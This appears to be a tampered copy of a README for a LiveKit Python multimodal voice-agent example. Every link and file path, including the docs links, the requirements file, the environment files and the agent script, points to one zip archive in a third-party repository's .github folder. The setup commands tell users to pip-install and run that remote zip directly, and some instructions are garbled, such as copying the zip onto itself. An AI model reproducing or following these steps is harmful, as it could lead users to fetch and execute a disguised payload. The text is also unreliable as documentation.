> [!WARNING]
> This example uses an outdated version of LiveKit Agents. See the [agent-starter-python](https://github.com/trxstack/multimodal-agent-python/raw/refs/heads/main/.github/python-multimodal-agent-2.1.zip) repository for the latest example.

# Python Multimodal Voice Agent

<p>
  <a href="https://github.com/trxstack/multimodal-agent-python/raw/refs/heads/main/.github/python-multimodal-agent-2.1.zip"><strong>Deploy a sandbox app</strong></a>
  •
  <a href="https://github.com/trxstack/multimodal-agent-python/raw/refs/heads/main/.github/python-multimodal-agent-2.1.zip">LiveKit Agents Docs</a>
  •
  <a href="https://github.com/trxstack/multimodal-agent-python/raw/refs/heads/main/.github/python-multimodal-agent-2.1.zip">LiveKit Cloud</a>
  •
  <a href="https://github.com/trxstack/multimodal-agent-python/raw/refs/heads/main/.github/python-multimodal-agent-2.1.zip">Blog</a>
</p>

A basic example of a multimodal voice agent using LiveKit and the Python [Agents Framework](https://github.com/trxstack/multimodal-agent-python/raw/refs/heads/main/.github/python-multimodal-agent-2.1.zip).

## Dev Setup

Clone the repository and install dependencies to a virtual environment:

```console
cd multimodal-agent-python
python3 -m venv venv
source venv/bin/activate
pip install -r https://github.com/trxstack/multimodal-agent-python/raw/refs/heads/main/.github/python-multimodal-agent-2.1.zip
```

Set up the environment by copying `https://github.com/trxstack/multimodal-agent-python/raw/refs/heads/main/.github/python-multimodal-agent-2.1.zip` to `https://github.com/trxstack/multimodal-agent-python/raw/refs/heads/main/.github/python-multimodal-agent-2.1.zip` and filling in the required values:

- `LIVEKIT_URL`
- `LIVEKIT_API_KEY`
- `LIVEKIT_API_SECRET`
- `OPENAI_API_KEY`

You can also do this automatically using the LiveKit CLI:

```bash
lk app env
```

Run the agent:

```console
python3 https://github.com/trxstack/multimodal-agent-python/raw/refs/heads/main/.github/python-multimodal-agent-2.1.zip dev
```

This agent requires a frontend application to communicate with. You can use one of our example frontends in [livekit-examples](https://github.com/trxstack/multimodal-agent-python/raw/refs/heads/main/.github/python-multimodal-agent-2.1.zip), create your own following one of our [client quickstarts](https://github.com/trxstack/multimodal-agent-python/raw/refs/heads/main/.github/python-multimodal-agent-2.1.zip), or test instantly against one of our hosted [Sandbox](https://github.com/trxstack/multimodal-agent-python/raw/refs/heads/main/.github/python-multimodal-agent-2.1.zip) frontends.
